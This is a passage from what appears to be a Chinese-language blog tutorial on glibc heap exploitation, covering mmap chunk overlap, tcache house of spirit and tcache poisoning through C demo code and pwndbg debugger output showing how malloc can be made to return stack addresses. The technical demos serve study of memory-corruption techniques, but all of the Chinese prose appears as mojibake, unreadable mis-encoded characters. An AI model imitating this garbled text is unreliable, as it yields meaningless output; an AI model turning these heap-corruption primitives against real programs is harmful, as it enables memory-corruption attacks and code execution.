ï¼Œ ç”±äºå‰é¢å‘ç”Ÿçš„åˆå¹¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª é‡å çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> â–º <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ overlapping_chunk çš„æ•°æ®å†…å®¹çš„åŒæ—¶ï¼Œå°±æ˜¯æŠŠ mmap_chunk_2 çš„å€¼ä¿®æ”¹äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> â–º <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>é¦–å…ˆ malloc ä¸€ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">â–º <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨æ ˆä¸Šæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯æ§ç›®æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªå¯æ§ç›®æ ‡ä¼ªé€ æˆä¸€ä¸ªä¸€ä¸ªchunk ï¼Œä¿®æ”¹å…¶å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free è¿™ä¸ªä¼ªé€ çš„ chunk ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œåœ¨ tcache ä¸Šæœ‰ä¸€ä¸ªæ ˆåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å†malloc ä¸€æ¬¡ï¼Œå°±èƒ½æŠŠè¿™ä¸ªæ ˆåœ°å€æ‹¿å›æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> â–º <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7ffe02d9a9e0</span> â€”â–¸ <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7ffe02d9a9f0</span> â€”â–¸ <span class="number">0x55c7abd8f040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7ffe02d9a9f8</span> â—‚â€” <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7ffe02d9aa10</span> â€”â–¸ <span class="number">0x7ffe02d9aa36</span> â—‚â€” <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7ffe02d9aa18</span> â€”â–¸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) â—‚â€” add    rbx, <span class="number">1</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>é€šè¿‡åŠ«æŒä¿®æ”¹  tcache fd çš„å½¢å¼æ¥ï¼Œæ¥è·å–ä¸€ä¸ªç›®æ ‡åœ°å€,  è¿™é‡Œçš„ç›®æ ‡æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œ ä½œç”¨äº 8 æŒºç›¸ä¼¼çš„</p><p>malloc ä¸¤ä¸ª chunk ï¼Œåˆ†åˆ«ä¸º a å’Œ b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">â–º <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>ç„¶åå†ä¸€æ¬¡å°†ä»–ä»¬ free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x55ce97ce62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å°±æœ‰å¦‚ä¸Šçš„é“¾è¡¨ç»“æ„ï¼Œå‡è®¾æˆ‘ä»¬å¯ä»¥æº¢å‡ºç¬¬ä¸€ä¸ª chunkï¼Œé‚£ä¹ˆä»¬å°±èƒ½ä¿®æ”¹ç¬¬äºŒä¸ª chunk çš„fd ,åˆ™æˆ‘ä»¬å°† chunk b çš„fd ä¿®æ”¹ä¸ºæ ˆåœ°å€,æ­¤æ—¶ tcachebins å°±å˜æˆå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> â–º <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fff96c64620</span> â€”â–¸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚ rdx  <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fff96c64630</span> â€”â–¸ <span class="number">0x55ce97ce62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fff96c64638</span> â€”â–¸ <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fff96c64640</span> â€”â–¸ <span class="number">0x7fff96c64740</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fff96c64648</span> â—‚â€” <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rbp  <span class="number">0x7fff96c64650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fff96c64658</span> â€”â–¸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) â—‚â€” mov    edi, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å‘ç° å˜æˆäº† b â€”&gt; &amp;stack_var ,ç„¶åæˆ‘ä»¬åªéœ€ malloc ä¸¤æ¬¡å°±èƒ½å°†æ ˆåœ°å€æ‹¿åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span 